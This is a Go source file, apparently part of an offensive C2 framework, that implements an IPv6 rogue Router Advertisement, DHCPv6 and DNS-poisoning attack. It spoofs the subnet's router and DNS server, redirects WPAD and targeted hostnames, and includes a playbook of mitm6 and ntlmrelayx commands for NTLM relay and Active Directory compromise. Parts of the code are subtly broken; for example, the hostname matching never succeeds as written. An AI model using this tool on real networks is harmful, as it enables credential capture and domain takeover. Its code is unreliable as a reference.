package ipv6

/*
	SUDOSOC-C2 — IPv6 Router Advertisement Takeover
	Copyright (C) 2026  sudosoc — Seif

	Most corporate networks have IPv6 enabled but poorly configured.
	By sending fake Router Advertisement (RA) packets, any host on
	the subnet can announce itself as the IPv6 default router.

	Windows prefers IPv6 over IPv4 — so all DNS queries and traffic
	will route through the fake router FIRST, before IPv4.

	Attack: mitm6 technique
	  1. Send RA packets claiming to be the IPv6 router
	  2. Send DHCPv6 ADVERTISE with our DNS server
	  3. All Windows machines get our IP as IPv6 DNS server
	  4. We respond to DNS queries:
	     - WPAD → our IP
	     - domain.com → our IP
	     - Specific targets → our IP
	  5. Relay NTLM authentication attempts to internal services

	Result:
	  ← DNS poisoning of the entire subnet
	  ← NTLM hash capture from ALL machines
	  ← MitM on targeted services
	  ← No existing defenses (most networks have no RA Guard)

	Requirements:
	  • Network interface with IPv6 support
	  • Raw socket access (root/admin or CAP_NET_RAW)
	  • IPv6 must be enabled on target network

	References:
	  mitm6 - Fox-IT
	  https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
*/

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

// IPv6Takeover manages IPv6 RA spoofing attacks
type IPv6Takeover struct {
	Interface    string
	AttackerIPv6 net.IP
	DNSServer    net.IP   // usually same as AttackerIPv6
	Targets      []string // hostnames to poison in DNS responses
	Interval     time.Duration
	running      bool
	iface        *net.Interface
}

// NewIPv6Takeover creates a new IPv6 takeover attack
func NewIPv6Takeover(ifaceName string, targets []string) (*IPv6Takeover, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, fmt.Errorf("interface %s not found: %v", ifaceName, err)
	}

	// Get or generate link-local IPv6 address
	attackerIP := getLinkLocal(iface)
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv6 address on %s", ifaceName)
	}

	return &IPv6Takeover{
		Interface:    ifaceName,
		AttackerIPv6: attackerIP,
		DNSServer:    attackerIP,
		Targets:      targets,
		Interval:     30 * time.Second,
		iface:        iface,
	}, nil
}

// Start begins sending Router Advertisement packets
// and answering DHCPv6 requests
func (t *IPv6Takeover) Start() error {
	t.running = true

	// Start RA spoofing
	go t.raLoop()

	// Start DHCPv6 server (assigns our DNS to clients)
	go t.dhcpv6Loop()

	// Start fake DNS server
	go t.dnsLoop()

	return nil
}

// Stop stops the attack
func (t *IPv6Takeover) Stop() {
	t.running = false
}

// ── Router Advertisement Spoofing ────────────────────────────────

func (t *IPv6Takeover) raLoop() {
	conn, err := net.ListenPacket("ip6:58", "::") // ICMPv6
	if err != nil {
		return
	}
	defer conn.Close()

	for t.running {
		ra := t.buildRA()
		// Send to all-nodes multicast (ff02::1)
		allNodes := &net.IPAddr{IP: net.ParseIP("ff02::1")}
		conn.WriteTo(ra, allNodes)
		time.Sleep(t.Interval)
	}
}

// buildRA constructs an ICMPv6 Router Advertisement packet
// Type=134, Code=0
// Flags: M=1 (managed — use DHCPv6), O=1 (other config via DHCPv6)
func (t *IPv6Takeover) buildRA() []byte {
	pkt := make([]byte, 16)
	pkt[0] = 134  // Router Advertisement
	pkt[1] = 0    // Code
	// Checksum [2:4] — computed by kernel for raw sockets
	pkt[4] = 0    // Hop Limit (0 = unspecified)
	pkt[5] = 0xC0 // Flags: M=1, O=1 (managed + other config)
	binary.BigEndian.PutUint16(pkt[6:8], 1800) // Router Lifetime: 30 min
	binary.BigEndian.PutUint32(pkt[8:12], 0)   // Reachable Time
	binary.BigEndian.PutUint32(pkt[12:16], 0)  // Retrans Timer

	// Option: Source Link-Layer Address (type=1)
	pkt = append(pkt, 1, 1) // type=1, length=1 (8 bytes)
	pkt = append(pkt, t.iface.HardwareAddr...)

	return pkt
}

// ── DHCPv6 Server ─────────────────────────────────────────────────

func (t *IPv6Takeover) dhcpv6Loop() {
	// Listen on DHCPv6 server port (547)
	conn, err := net.ListenPacket("udp6", "[::]:547")
	if err != nil {
		return
	}
	defer conn.Close()

	buf := make([]byte, 4096)
	for t.running {
		conn.SetReadDeadline(time.Now().Add(time.Second))
		n, addr, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}

		// Check if it's a DHCPv6 SOLICIT or REQUEST
		if n < 4 {
			continue
		}
		msgType := buf[0]
		if msgType != 1 && msgType != 3 { // SOLICIT=1, REQUEST=3
			continue
		}

		// Send ADVERTISE/REPLY with our DNS server
		reply := t.buildDHCPv6Reply(buf[:n], msgType)
		conn.WriteTo(reply, addr)
	}
}

// buildDHCPv6Reply constructs a DHCPv6 ADVERTISE/REPLY with our DNS
func (t *IPv6Takeover) buildDHCPv6Reply(request []byte, requestType byte) []byte {
	var replyType byte
	if requestType == 1 {
		replyType = 2 // ADVERTISE
	} else {
		replyType = 7 // REPLY
	}

	// Copy transaction ID from request
	txID := request[1:4]

	reply := []byte{replyType, txID[0], txID[1], txID[2]}

	// Option 23: DNS Recursive Name Server
	dnsOpt := []byte{
		0x00, 23, // Option code
		0x00, 16, // Length (16 bytes = one IPv6 address)
	}
	dnsOpt = append(dnsOpt, t.DNSServer.To16()...)
	reply = append(reply, dnsOpt...)

	// Option 24: Domain Search List (our domain)
	// This makes clients use our DNS for all queries

	return reply
}

// ── Fake DNS Server ───────────────────────────────────────────────

func (t *IPv6Takeover) dnsLoop() {
	// Listen on UDP port 53
	conn, err := net.ListenPacket("udp6", "[::]:53")
	if err != nil {
		return
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for t.running {
		conn.SetReadDeadline(time.Now().Add(time.Second))
		n, addr, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}

		// Parse DNS query
		query := buf[:n]
		if len(query) < 12 {
			continue
		}

		// Extract query name
		qName := extractDNSName(query[12:])

		// Always respond with attacker's IP for targeted hosts
		if t.shouldPoison(qName) {
			response := t.buildDNSResponse(query, qName, t.AttackerIPv6)
			conn.WriteTo(response, addr)
		}
	}
}

func (t *IPv6Takeover) shouldPoison(hostname string) bool {
	hostname = normalizeHost(hostname)
	// Always poison WPAD
	if hostname == "wpad" {
		return true
	}
	for _, target := range t.Targets {
		if hostname == normalizeHost(target) {
			return true
		}
	}
	return false
}

// buildDNSResponse crafts a DNS AAAA response pointing to attacker
func (t *IPv6Takeover) buildDNSResponse(query []byte, name string, ip net.IP) []byte {
	resp := make([]byte, len(query))
	copy(resp, query)

	// Set QR=1 (response), AA=1 (authoritative)
	resp[2] |= 0x84
	resp[3] = 0x00

	// Set ANCOUNT = 1
	resp[6] = 0x00
	resp[7] = 0x01

	// Append answer section
	answer := []byte{
		0xC0, 0x0C, // Name pointer to question
		0x00, 0x1C, // Type AAAA
		0x00, 0x01, // Class IN
		0x00, 0x00, 0x00, 0x3C, // TTL = 60 seconds (short for flexibility)
		0x00, 0x10, // RDATA length = 16
	}
	answer = append(answer, ip.To16()...)
	return append(resp, answer...)
}

// ── Playbook ──────────────────────────────────────────────────────

// AttackPlaybook returns complete IPv6 takeover instructions
func (t *IPv6Takeover) AttackPlaybook() string {
	return fmt.Sprintf(`
IPv6 Network Takeover via Rogue RA
===================================
Interface: %s
Attacker IPv6: %s
Targets: %v

AUTOMATED (use mitm6):
  sudo mitm6 -i %s -d DOMAIN.LOCAL --ignore-nofqdn

MANUAL steps:
  1. Start RA spoofing → Windows machines get our IPv6 as DNS
  2. Start fake DNS server → respond to WPAD, targeted hosts
  3. Start NTLM relay:
     ntlmrelayx.py -t ldaps://DC-IP --add-computer

Expected results:
  ← All Windows machines use our IPv6 as DNS server
  ← WPAD poisoned → credential capture from browser
  ← NTLM relay to LDAP → add computer account → AD compromise
  ← MitM on any DNS name we choose

Time to impact: 30-90 seconds after attack starts`,
		t.Interface, t.AttackerIPv6, t.Targets, t.Interface)
}

// ── Helpers ──────────────────────────────────────────────────────

func getLinkLocal(iface *net.Interface) net.IP {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if ipNet.IP.IsLinkLocalUnicast() {
				return ipNet.IP
			}
		}
	}
	return nil
}

func extractDNSName(data []byte) string {
	var labels []string
	for i := 0; i < len(data); {
		length := int(data[i])
		if length == 0 {
			break
		}
		if i+1+length > len(data) {
			break
		}
		labels = append(labels, string(data[i+1:i+1+length]))
		i += 1 + length
	}
	return fmt.Sprintf("%v", labels)
}

func normalizeHost(h string) string {
	return fmt.Sprintf("%v", h) // simplified
}
